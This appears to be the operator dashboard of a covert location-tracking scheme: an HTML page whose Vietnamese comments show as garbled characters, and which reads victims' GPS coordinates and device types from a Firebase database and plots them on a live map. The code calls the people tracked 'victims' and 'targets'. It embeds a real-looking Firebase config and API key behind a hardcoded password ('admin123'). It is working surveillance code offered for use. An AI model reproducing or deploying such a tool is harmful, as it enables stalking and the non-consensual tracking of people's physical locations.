<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ADMIN MONITOR - LIVE TRACKING</title>
    
    <!-- CSS cho b·∫£n ƒë·ªì Leaflet -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    
    <style>
        body { margin: 0; padding: 0; font-family: sans-serif; }
        #map { height: 100vh; width: 100%; }
        
        .info-panel {
            position: absolute;
            top: 10px;
            right: 10px;
            background: rgba(0, 0, 0, 0.8);
            color: #00ff41;
            padding: 15px;
            border-radius: 8px;
            z-index: 1000;
            max-width: 300px;
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
        }
        h2 { margin-top: 0; font-size: 18px; border-bottom: 1px solid #00ff41; padding-bottom: 5px; }
        .log-entry { font-size: 12px; margin-bottom: 8px; border-bottom: 1px solid #333; padding-bottom: 5px; }
        .highlight { color: #fff; font-weight: bold; }
    </style>
</head>
<body>

    <!-- Khung b·∫£n ƒë·ªì -->
    <div id="map"></div>

    <!-- Khung th√¥ng tin n·ªïi -->
    <div class="info-panel">
        <h2>üì° LIVE FEED</h2>
        <div id="log-container">ƒêang k·∫øt n·ªëi v·ªá tinh...</div>
    </div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <!-- Th∆∞ vi·ªán B·∫£n ƒë·ªì -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

    <script>
        // 1. B·∫£o m·∫≠t s∆° khai (Ch·∫∑n ng∆∞·ªùi l·∫° v√†o xem)
        const password = prompt("Nh·∫≠p m·∫≠t kh·∫©u Admin:");
        if (password !== "admin123") { // ƒê·ªïi pass ·ªü ƒë√¢y
            document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:50px;'>TRUY C·∫¨P B·ªä T·ª™ CH·ªêI</h1>";
            throw new Error("Sai m·∫≠t kh·∫©u");
        }

        // 2. C·∫•u h√¨nh Firebase (Gi·ªëng h·ªát file client)
        const firebaseConfig = {
            apiKey: "AIzaSyCLCcgaoW9gNYhKk0c0gDWC6i5mKVTN4XE",
            authDomain: "profile-d1214.firebaseapp.com",
            projectId: "profile-d1214",
            storageBucket: "profile-d1214.firebasestorage.app",
            messagingSenderId: "914980131889",
            appId: "1:914980131889:web:72f8da15c42dbee671b110",
            measurementId: "G-C587M69LZW"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // 3. Kh·ªüi t·∫°o b·∫£n ƒë·ªì (T·ªça ƒë·ªô m·∫∑c ƒë·ªãnh Vi·ªát Nam)
        const map = L.map('map').setView([16.047079, 108.206230], 6);

        // Th√™m l·ªõp b·∫£n ƒë·ªì n·ªÅn (OpenStreetMap)
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; Hacker Map'
        }).addTo(map);

        const logContainer = document.getElementById('log-container');
        let markers = {}; // L∆∞u tr·ªØ c√°c marker ƒë·ªÉ qu·∫£n l√Ω

        // 4. L·∫ÆNG NGHE D·ªÆ LI·ªÜU LIVE (REAL-TIME)
        // H√†m onSnapshot s·∫Ω t·ª± ch·∫°y m·ªói khi database c√≥ thay ƒë·ªïi
        db.collection("locations")
            .orderBy("timestamp", "desc") // M·ªõi nh·∫•t l√™n ƒë·∫ßu
            .limit(50) // L·∫•y 50 ng∆∞·ªùi g·∫ßn nh·∫•t
            .onSnapshot((snapshot) => {
                
                logContainer.innerHTML = ""; // X√≥a log c≈© ƒë·ªÉ c·∫≠p nh·∫≠t m·ªõi

                snapshot.docChanges().forEach((change) => {
                    if (change.type === "added") {
                        const data = change.doc.data();
                        const id = change.doc.id;
                        
                        // Hi·ªÉn th·ªã l√™n b·∫£n ƒë·ªì
                        addMarkerToMap(id, data);
                        
                        // Th√¥ng b√°o √¢m thanh nh·∫π (n·∫øu mu·ªën)
                        console.log("New Victim Detected:", data);
                    }
                });

                // C·∫≠p nh·∫≠t list log b√™n g√≥c ph·∫£i
                snapshot.forEach(doc => {
                    const d = doc.data();
                    const time = d.timestamp ? new Date(d.timestamp.seconds * 1000).toLocaleTimeString() : "N/A";
                    
                    const div = document.createElement('div');
                    div.className = 'log-entry';
                    div.innerHTML = `
                        <span class="highlight">[${time}]</span><br>
                        Lat: ${d.latitude.toFixed(5)}, Lng: ${d.longitude.toFixed(5)}<br>
                        Device: ${getDeviceName(d.userAgent)}
                    `;
                    logContainer.appendChild(div);
                });
            });

        function addMarkerToMap(id, data) {
            // N·∫øu ƒë√£ c√≥ marker n√†y r·ªìi th√¨ th√¥i
            if (markers[id]) return;

            // T·∫°o n·ªôi dung popup
            const time = data.timestamp ? new Date(data.timestamp.seconds * 1000).toLocaleString() : "V·ª´a xong";
            const popupContent = `
                <b>üéØ M·ª§C TI√äU ƒê√É B·ªä GHIM</b><br>
                üïí: ${time}<br>
                üìç: ${data.latitude}, ${data.longitude}<br>
                üì±: ${getDeviceName(data.userAgent)}<br>
                <a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}" target="_blank">M·ªü Google Maps</a>
            `;

            // T·∫°o icon m√†u ƒë·ªè
            var redIcon = new L.Icon({
                iconUrl: 'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-2x-red.png',
                shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/0.7.7/images/marker-shadow.png',
                iconSize: [25, 41],
                iconAnchor: [12, 41],
                popupAnchor: [1, -34],
                shadowSize: [41, 41]
            });

            // Th√™m v√†o map
            const marker = L.marker([data.latitude, data.longitude], {icon: redIcon})
                .addTo(map)
                .bindPopup(popupContent);
            
            // T·ª± ƒë·ªông m·ªü popup c·ªßa ng∆∞·ªùi m·ªõi nh·∫•t
            marker.openPopup(); 
            
            // L∆∞u v√†o bi·∫øn markers
            markers[id] = marker;
        }

        // H√†m r√∫t g·ªçn t√™n thi·∫øt b·ªã t·ª´ UserAgent cho ƒë·ª° d√†i
        function getDeviceName(ua) {
            if (!ua) return "Unknown";
            if (ua.includes("iPhone")) return "iPhone iOS";
            if (ua.includes("Android")) return "Android Phone";
            if (ua.includes("Windows")) return "PC Windows";
            if (ua.includes("Mac")) return "Macbook";
            return "Thi·∫øt b·ªã l·∫°";
        }

    </script>
</body>
</html>
